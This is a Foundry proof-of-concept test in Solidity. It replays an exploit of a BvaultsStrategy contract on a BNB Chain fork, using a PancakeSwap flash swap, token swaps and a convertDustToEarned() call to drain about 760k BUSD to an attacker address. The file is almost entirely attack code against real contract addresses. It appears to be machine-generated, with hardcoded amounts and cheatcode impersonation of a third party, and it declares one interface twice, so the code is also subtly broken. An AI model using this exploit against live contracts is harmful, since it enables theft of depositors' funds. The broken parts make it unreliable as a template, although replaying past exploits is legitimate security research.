
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 34099688;
    uint256 constant TX_TIMESTAMP = 1701813183;
    uint256 constant TX_BLOCK_NUMBER = 34099689;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.BUSD, "BUSD", 760889017097225537647455);
    }
}

contract OurAttack {



    function attack() external payable {
        _attack();
    }

    function _callback() internal {
        _markCallback(0);
        IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
        uint256 wbnbBalanceOfAttackAttackContract = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        {
            if (wbnbBalanceOfAttackAttackContract != 0) {
                IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, wbnbBalanceOfAttackAttackContract);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        wbnbBalanceOfAttackAttackContract,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.ALPACA),
                        address(this),
                        1701813243
                    );
            }
        }
        IBvaultsStrategy(Addresses.BvaultsStrategy).convertDustToEarned();
        IERC20Like(Addresses.ALPACA).approve(Addresses.PancakeRouter, type(uint256).max);
        uint256 alpacaBalanceOfAttackAttackContract = IERC20Like(Addresses.ALPACA).balanceOf(address(this));
        {
            if (alpacaBalanceOfAttackAttackContract != 0) {
                IERC20Like(Addresses.ALPACA)
                    .approve(Addresses.PancakeRouter, alpacaBalanceOfAttackAttackContract);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        alpacaBalanceOfAttackAttackContract,
                        0,
                        _addressArray2(Addresses.ALPACA, Addresses.WBNB),
                        address(this),
                        1701813243
                    );
            }
        }
        uint256 wbnbApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, wbnbApproveAllowance);
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
        {
            if (1445602616404598650387 != 0) {
                IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, 1445602616404598650387);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        1445602616404598650387,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.BUSD),
                        Addresses.attacker_eoa,
                        1701813243
                    );
            }
        }
        uint256 wbnbTransferFromAmount = 100000000000000000;
        {
            uint256 transferFromAmount = wbnbTransferFromAmount;
            if (transferFromAmount != 0) {
                Harness.vmExt().startPrank(Addresses.A_1CCC8E_92B1);
                IERC20Like(Addresses.WBNB).transfer(address(this), transferFromAmount);
                Harness.vmExt().stopPrank();
            }
        }
        uint256 wbnbTransferAmount = 10025062656641604020000;
        IERC20Like(Addresses.WBNB).transfer(Addresses.Cake_LP, wbnbTransferAmount);
    }

    function _attack() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(8)),
                bytes32(uint256(164413542723715806570740332735693303317642973873))
            );
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 10000000000000000000000, address(this), hex"00");
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x84800812) {
            _callback();
            return;
        }
        if (msg.sig == 0xd018db3e) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
    address internal constant Cake = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address internal constant Cake_LP = 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
    address internal constant Cake_LP_774F = 0x1B96B92314C44b159149f7E0303511fB2Fc4774f;
    address internal constant A_1CCC8E_92B1 = 0x1ccC8eE8Ad0f70E0Bb362d56035fF241755192b1;
    address internal constant BvaultsStrategy = 0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e;
    address internal constant ALPACA = 0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attacker_eoa = 0xCE27b195Fa6dE27081a86b98b64f77F5FB328dd5;
    address internal constant attack_contract = 0xe1997bC971D5986AA57Ee8ffB57eb1DeBa4fDAaa;
    address internal constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address internal constant Cake_LP_3083 = 0xF3CE6Aac24980E6B657926dfC79502Ae414d3083;
}

interface IBvaultsStrategy {
    function convertDustToEarned() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
